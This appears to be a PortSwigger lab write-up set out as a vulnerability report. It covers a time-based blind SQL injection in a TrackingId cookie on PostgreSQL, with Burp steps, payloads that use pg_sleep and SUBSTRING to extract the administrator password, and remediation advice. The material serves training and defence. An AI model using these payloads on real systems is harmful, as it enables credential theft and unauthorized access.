
---
  

# Blind SQL Injection in TrackingId Cookie allows Conditional Database Information Retrieval

## 1. Executive Summary

A time-based blind SQL injection vulnerability was identified in the `TrackingId` cookie of the application's front page. An attacker can inject conditional PostgreSQL queries that introduce a measurable delay when a specified condition is true, allowing sensitive database information such as the administrator username and password to be extracted character by character.

## 2. Vulnerability Details

- **Vulnerability Type:** Blind SQL Injection — Time-Based Information Retrieval
    
- **Target Endpoint/URL:** Shop front page `/`
    
- **Affected Parameter:** `TrackingId` cookie
    
- **Database:** PostgreSQL
    
- **Authentication Level Required:** Unauthenticated
    

## 3. Steps to Reproduce (STR)

1. Visit the front page of the shop.
    
2. Open **Burp Suite → Proxy → HTTP history**.
    
3. Locate the request containing the `TrackingId` cookie.
    
4. Send the request to **Burp Repeater**.
    
5. Replace the `TrackingId` value with the following payload:
    

```
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

6. Send the request and observe that the application takes approximately **10 seconds** to respond.
    
7. Change the condition to a false condition:
    

```
TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

8. Send the request again. The application responds immediately without the 10-second delay.
    
9. This confirms that the response time can be used as a **boolean oracle** to determine whether an injected condition is true or false.
    

### Identify the Administrator User

10. Modify the payload to test whether an `administrator` account exists:
    

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

11. Send the request.
    
12. The application takes approximately **10 seconds** to respond, confirming that the condition is true and that a user named `administrator` exists.
    

### Determine the Password Length

13. Test whether the administrator's password is longer than one character:
    

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

14. The delayed response confirms that the condition is true.
    
15. Continue increasing the tested length:
    

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

16. Continue until the application responds immediately rather than after approximately 10 seconds.
    
17. The administrator password is **20 characters long**.
    

### Extract the Password Character by Character

18. Send the current request to **Burp Intruder**.
    
19. Configure the `TrackingId` cookie with the following payload:
    

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

20. Place payload markers around the character being tested:
    

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

21. In **Burp Intruder → Payloads**, select **Simple list**.
    
22. Add the possible password characters:
    

- `a-z`
    
- `0-9`
    

23. Configure the Intruder attack to use a **single concurrent request** so that response-time differences can be measured reliably.
    
24. Launch the attack.
    
25. Examine the **Response received** column.
    
26. Most requests should complete quickly, while the request containing the correct character should take approximately **10,000 ms**.
    
27. The payload associated with the delayed request is the first password character.
    
28. Change the `SUBSTRING()` offset from `1` to `2`:
    

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

29. Repeat the Intruder attack to determine the second character.
    
30. Continue with offsets `3`, `4`, and so on until all **20 characters** have been recovered.
    
31. Use the recovered password to log in through **My account** as the `administrator` user.
    

## 4. Proof of Concept (PoC)

### HTTP Request/Response

**Boolean true condition:**

```
Cookie: TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

**Observed response:**

```
Response time: ~10 seconds
```

**Boolean false condition:**

```
Cookie: TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

**Observed response:**

```
Response time: Immediate
```

This establishes the time-based boolean oracle.

**Administrator existence check:**

```
Cookie: TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

**Observed response:**

```
Response time: ~10 seconds
```

This confirms that the `administrator` account exists.

**Password character extraction:**

```
Cookie: TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

The correct character produces a response of approximately:

```
10,000 ms
```

while incorrect characters respond normally.

### Evidence (Screenshots/Video)




## 5. Impact Analysis

### Technical Impact

The vulnerability allows an unauthenticated attacker to use response-time differences as a boolean oracle. By repeatedly testing conditions, the attacker can infer database contents without requiring the application to directly return SQL query results.

In this lab, the attacker was able to:

- Confirm the existence of the `administrator` user.
    
- Determine that the administrator password contains **20 characters**.
    
- Extract the password one character at a time using `SUBSTRING()`.
    
- Authenticate as the administrator account using the recovered credentials.
    

### Business Impact

An attacker exploiting this vulnerability could potentially retrieve sensitive database information, including authentication credentials and user data. If privileged credentials are exposed, this could result in unauthorized account access, privilege escalation, data exposure, and further compromise of the application.

## 6. Remediation & References

### Suggested Fix

1. Use **parameterized queries / prepared statements** for all database operations.
    
2. Never concatenate the `TrackingId` cookie or other user-controlled input directly into SQL statements.
    
3. Apply the **principle of least privilege** to the application's database account.
    
4. Store passwords using strong, slow password-hashing algorithms such as **Argon2id** or **bcrypt**, rather than plaintext or reversible encryption.
    
5. Avoid exposing database errors or other backend behavior that can assist attackers.
    
6. Implement monitoring and rate limiting where appropriate to detect repeated requests designed to infer database information through timing differences.
    

### References

- OWASP Top 10 — A03: Injection
    
- OWASP SQL Injection Prevention Cheat Sheet
    
- CWE-89 — Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
    
- PortSwigger Web Security Academy — Blind SQL Injection